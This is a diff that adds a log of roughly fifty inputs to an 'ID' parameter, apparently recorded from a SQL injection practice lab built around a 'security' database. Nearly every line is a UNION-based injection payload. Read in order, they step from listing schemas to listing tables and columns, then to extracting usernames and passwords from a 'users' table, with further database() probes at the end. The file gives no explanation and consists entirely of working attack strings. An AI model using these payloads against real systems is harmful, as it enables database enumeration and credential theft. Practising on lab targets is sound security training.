@@ -1,0 +1,54 @@
+ID:1
+ID:-1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:-1 union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:-1 union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.table-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--'
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'-- 
+ID:id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='users'-- 
+ID:id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- 
+ID:-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'-- 
+ID:-1'union select username,password from users where id=2-- 
+ID:-1'union select username,password from users where id=2-- 
+ID:-1'union select 1,username,password from users where id=2-- 
+ID:-1'union select 1,username,password from users where id=2-- 
+ID:-1'union select 1,username,password from users where id=2-- 
+ID:-1'union select 1,username,password from users where id=2-- 
+ID:-1'union select 1,username,password,7 from users where id=2-- 
+ID:1'
+ID:1'-- 
+ID:1
+ID:1 and select(database())
+ID:-1 and select 1,(select(database())),3 from database()-- 
+ID:-1  union  select 1,(select(database())),3 -- 
+ID:-1  union  select 1,database(),3 -- 
+ID:-1 union select 1,database(),3 -- 
+ID:-1' union select 1,database(),3 -- 
